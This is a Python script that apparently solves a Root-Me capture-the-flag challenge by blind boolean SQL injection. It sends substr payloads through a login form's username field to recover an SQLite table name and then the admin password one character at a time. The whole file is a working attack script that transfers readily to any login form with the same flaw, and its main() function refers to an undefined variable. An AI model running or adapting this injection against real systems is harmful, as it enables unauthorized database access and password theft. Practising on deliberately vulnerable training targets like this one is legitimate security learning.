import requests



def get_table_name():
	print('[*] Finding the table:')
	table_name = ''

	for table_name_index in range(1, 15):
		if table_name_index > 1 and stop_value == table_name:
			break;
		else:
			stop_value = table_name
		for i in charset:
			payload = f"' or substr((select name from sqlite_master where type = 'table') , {table_name_index}, 1) = '{i}'-- -"
			login = {'username': payload, 'password': 'xxhackerxx'}

			r = requests.post(url, data=login)
			r = r.text
			if 'Welcome' in r:
				print(i)
				table_name += i
	print(f'Table found: {table_name}')
	print(f'[*] Finding the admin password:')
	get_password(table_name)


def get_password(table_name):
	password = ''

	for password_index in range(1, 15):
		if password_index > 1 and stop_value == password:
			break;
		else:
			stop_value = password
		for i in charset:
			payload = f"' or substr((select password from {table_name} where username = 'admin') , {password_index}, 1) = '{i}'-- -"
			login = {'username': payload, 'password': 'xxhackerxx'}

			r = requests.post(url, data=login)
			r = r.text
			if 'Welcome' in r:
				print(i)
				password += i
	print(f'Password found: {password}')


def main():
	get_table_name()
	get_password(table_name)


if __name__ == "__main__":
	url = 'http://challenge01.root-me.org/web-serveur/ch10/'
	charset = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789'
	get_table_name()
	